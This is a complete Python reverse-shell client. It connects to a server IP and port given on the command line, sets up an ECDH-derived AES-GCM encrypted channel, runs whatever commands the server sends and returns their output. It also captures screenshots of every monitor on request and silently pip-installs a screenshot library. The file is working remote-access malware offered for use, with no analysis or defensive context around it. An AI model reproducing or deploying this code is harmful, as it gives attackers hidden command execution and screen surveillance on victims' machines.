#!/usr/bin/env python3

import socket, argparse, subprocess, io
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.backends import default_backend
from PIL import Image
import os, subprocess

def try_install_mss():
    try:
        subprocess.run(["pip", "install", "mss"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        global mss
        import mss
    except Exception:
        pass

try:
    import mss
except ImportError:
    mss = None
    try_install_mss()

def aes_encrypt(data, key):
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, data, None)
    return nonce + ciphertext

def aes_decrypt(encrypted_data, key):
    aesgcm = AESGCM(key)
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:]
    return aesgcm.decrypt(nonce, ciphertext, None)

def capture_screenshots():
    if mss is None:
        return []
    screenshots = []
    with mss.mss() as sct:
        for monitor in sct.monitors:
            screenshot = sct.grab(monitor)
            buffer = io.BytesIO()
            Image.frombytes("RGB", screenshot.size, screenshot.rgb).save(buffer, format="PNG")
            screenshots.append(buffer.getvalue())
    return screenshots

def send_with_size(socket, data):
    size = len(data).to_bytes(4, byteorder='big')
    socket.sendall(size + data)

def reverse_shell(server_ip, server_port):
    client_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    client_public_key = client_private_key.public_key()

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    try:
        server_public_key_bytes = client.recv(4096)
        server_public_key = serialization.load_pem_public_key(
            server_public_key_bytes,
            backend=default_backend()
        )

        client.send(client_public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))

        shared_key = client_private_key.exchange(ec.ECDH(), server_public_key)
        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'handshake data',
            backend=default_backend()
        ).derive(shared_key)

        key = derived_key

        while True:
            encrypted_command = client.recv(4096)
            if not encrypted_command:
                break
            command = aes_decrypt(encrypted_command, key).decode('utf-8')
            if command.lower() == "exit":
                client.close()
                break
            elif command == "screenshot":
                screenshots = capture_screenshots()
                for screenshot_data in screenshots:
                    encrypted_screenshot = aes_encrypt(screenshot_data, key)
                    send_with_size(client, encrypted_screenshot)
                send_with_size(client, b"")
            else:
                output = subprocess.getoutput(command)
                encrypted_output = aes_encrypt(output.encode('utf-8'), key)
                send_with_size(client, encrypted_output)
    except Exception as e:
        print(f"[!] Error: {e}")
        client.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--server", required=True, help="Server IP address")
    parser.add_argument("-p", "--port", required=True, type=int, help="Server port")
    args = parser.parse_args()
    reverse_shell(args.server, args.port)